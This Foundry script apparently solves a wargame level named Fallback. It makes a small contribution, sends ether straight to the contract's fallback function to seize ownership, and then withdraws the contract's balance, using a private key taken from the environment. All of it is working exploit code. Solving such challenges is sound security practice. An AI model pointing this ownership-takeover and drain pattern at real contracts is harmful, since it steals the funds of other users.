// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../../lib/forge-std/src//Script.sol";
import {Fallback} from "../src/L2__Fallback.sol";

contract L2_Solution__Fallback is Script {
    Fallback public flbk =
        Fallback(payable(0x672555fe8322106F850e80808660272D710Af4Cb));

    function run() public {
        address _robber = vm.envAddress("ACCOUNT");
        address _owner = stealOwnership();

        require(_owner == _robber, "2 :: steal failed :(...");

        stealFunds();
    }

    function stealOwnership() public returns (address _owner) {
        bool _success = true;
        uint256 _robber = vm.envUint("PRIV_KEY");

        _owner = flbk.owner();
        vm.startBroadcast(_robber);

        (_success, ) = address(flbk).call{value: 1}(
            abi.encodeWithSignature("contribute()")
        );
        require(_success, "0 :: first contribution failed.");

        (_success, ) = address(flbk).call{value: 1}("");
        require(_success, "1 :: second contribution failed.");

        vm.stopBroadcast();
        _owner = flbk.owner();
    }

    function stealFunds() public {
        uint256 _robber = vm.envUint("PRIV_KEY");

        vm.startBroadcast(_robber);
        flbk.withdraw();
        vm.stopBroadcast();
    }
}
